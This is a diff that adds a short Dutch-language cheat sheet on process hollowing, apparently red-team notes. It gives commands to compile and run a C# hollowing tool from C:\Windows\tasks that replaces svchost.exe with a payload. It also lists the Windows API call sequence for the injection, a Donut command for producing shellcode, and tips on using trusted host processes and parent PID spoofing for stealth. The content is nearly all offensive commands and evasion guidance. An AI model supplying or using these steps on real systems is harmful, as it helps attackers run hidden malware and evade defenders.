@@ -1,0 +1,11 @@
+# Process Hollowing - Legitiem proces vervangen met payload
+# Stap 1: Compileer C# hollowing tool
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:exe /out:C:\Windows\tasks\hollow.exe C:\Windows\tasks\hollow.cs
+# Stap 2: Uitvoeren (vervangt svchost.exe proces met payload)
+C:\Windows\tasks\hollow.exe
+# Concept: CreateProcess(SUSPENDED) -> NtUnmapViewOfSection -> VirtualAllocEx -> WriteProcessMemory -> SetThreadContext -> ResumeThread
+# Alternatief: Gebruik Donut + loader voor shellcode in gehollowed proces
+# Donut payload genereren:
+# donut.exe -f payload.exe -o payload.bin -a 2 -e 3
+# Tip: Gebruik een trusted process als host (svchost.exe, RuntimeBroker.exe)
+# Tip: Parent PID spoofing combineren voor extra stealth
